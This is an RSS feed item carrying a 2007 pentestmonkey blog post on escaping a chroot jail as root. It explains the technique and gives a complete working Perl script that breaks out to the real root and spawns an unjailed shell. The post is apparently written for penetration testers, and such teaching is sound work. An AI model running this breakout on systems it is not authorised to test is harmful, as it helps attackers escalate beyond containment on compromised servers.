<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>chroot &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/chroot/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 20 Aug 2011 15:55:29 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Breaking Out of a Chroot Jail Using PERL</title>
		<link>https://pentestmonkey.net/blog/chroot-breakout-perl</link>
					<comments>https://pentestmonkey.net/blog/chroot-breakout-perl#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 09 Dec 2007 20:12:55 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[chroot]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=28</guid>

					<description><![CDATA[I had cause to want to break out of a chroot&#8217;d environment recently.  It is well known that if you&#8217;re root within the chroot environment you can break out of it. I set about learning how to break out of chroot and came across an excellent description by Simes from 2002.  It contains a well [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I had cause to want to break out of a chroot&#8217;d environment recently.  It is well known that if you&#8217;re root within the chroot environment you can break out of it.</p>
<p>I set about learning how to break out of chroot and came across an <a href="http://www.bpfh.net/simes/computing/chroot-break.html">excellent description</a> by Simes from 2002.  It contains a well documented C program that breaks out of the chroot environment.</p>
<p>I wanted to use PERL to break out of the environment, as few chroot environments will contain a C compiler and you may not always be in a position to compile the above program for the OS and Architecture of your jail.</p>
<p><span id="more-28"></span></p>
<h3>Recap: What is Chroot?</h3>
<p>According to <a href="http://en.wikipedia.org/wiki/Chroot">wikipedia:</a></p>
<p><em>A chroot on Unix operating systems is an operation that changes the apparent disk root directory for the current running process and its children. A program that is re-rooted to another directory cannot access or name files outside that directory, called a chroot jail.</em></p>
<p>You&#8217;re likely to come across chroot environments when testing web servers or FTP servers.  Such services are exposed and therefore could be compromised.  If you comrpomise a chroot&#8217;d HTTP or FTP daemon you will only gain access to the limited chroot environment.  You will not be to access the real /etc/passwd for example.  You would only be able to access /some-path-you-dont-even-know-about/etc/passwd.  Your process is trapped inside a directory structure that you can&#8217;t break out of.</p>
<p>&#8230;unless you&#8217;re root.  If you escalate your privileges to root within the jail, it is possible to get out.  Your only obstacle is finding a way to make the &#8220;chroot&#8221; system call with the tools available to you inside the chroot jail &#8211; or uploading your own tools.  Your options include:</p>
<ul>
<li>Compiling a program such as <a href="http://www.bpfh.net/simes/computing/chroot-break.html">this</a> on the target host &#8211; but you probably don&#8217;t have a C compiler in the chroot jail.</li>
<li> Uploading a precompiled chroot-escaper &#8211; if you have one for the target OS/architecture.</li>
<li>Using an installed scripting language (PERL, PHP, Python) &#8211; if there&#8217;s one installed</li>
</ul>
<h3>Overview of Breaking out of Chroot</h3>
<p>The C program referenced about uses this technique:</p>
<ol>
<li>Open a file handle to the root of the jail</li>
<li>Create a sub directory in the jail and chroot yourself there (you are root, so you are allowed to chroot).  You&#8217;re now even deeper in the jail.</li>
<li>Change directory using the file handle to the root of the old jail.  You&#8217;re now outside of the chroot jail you created in the sub directory.  You&#8217;re free!  Well, kind of.  Actually all locations starting with &#8216;/&#8217; are still mapped to that sub directory.  You don&#8217;t want this.</li>
<li>cd ..; cd ..; &#8230;until you reach the real root.</li>
<li>Chroot yourself in the real root.  Now you&#8217;re properly free.</li>
</ol>
<h3>The PERL Script</h3>
<p>Here&#8217;s a simple PERL implementation.  It seems to work on Linux:</p>
<pre>#!/usr/bin/perl -w
use strict;
# unchroot.pl Dec 2007
# http://pentestmonkey.net/blog/chroot-breakout-perl

# This script may be used for legal purposes only.

# Go to the root of the jail
chdir "/";

# Open filehandle to root of jail
opendir JAILROOT, "." or die "ERROR: Couldn't get file handle to root of jailn";

# Create a subdir, move into it
mkdir "mysubdir";
chdir "mysubdir";

# Lock ourselves in a new jail
chroot ".";

# Use our filehandle to get back to the root of the old jail
chdir(*JAILROOT);

# Get to the real root
while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
        chdir "..";
}

# Lock ourselves in real root - so we're not really in a jail at all now
chroot ".";

# Start an un-jailed shell
system("/bin/sh");</pre>
<h3>So is this a Vulnerability?</h3>
<p>To be clear, this is NOT a vulnerability. The root user is supposed to be able to change the root directory for the current process and for child processes. Chroot only jails non-root processes. Wikipedia clearly summarises the <a href="http://en.wikipedia.org/wiki/Chroot#Limitations">limitations</a> of chroot.</p>
<h3>Feedback</h3>
<p>Thanks to <a href="http://www.nth-dimension.org.uk/">timb</a> for the suggestion to change this:</p>
<pre>foreach my $count (1..100) {
        chdir "..";
}</pre>
<p>To this (which checks if &#8216;.&#8217; and &#8216;..&#8217; are the same thing):</p>
<pre>while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
        chdir "..";
}</pre>
<p>Much nicer. He even credited his source: &#8220;Solaris Systems Programming&#8221; by Rich Teer.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/chroot-breakout-perl/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
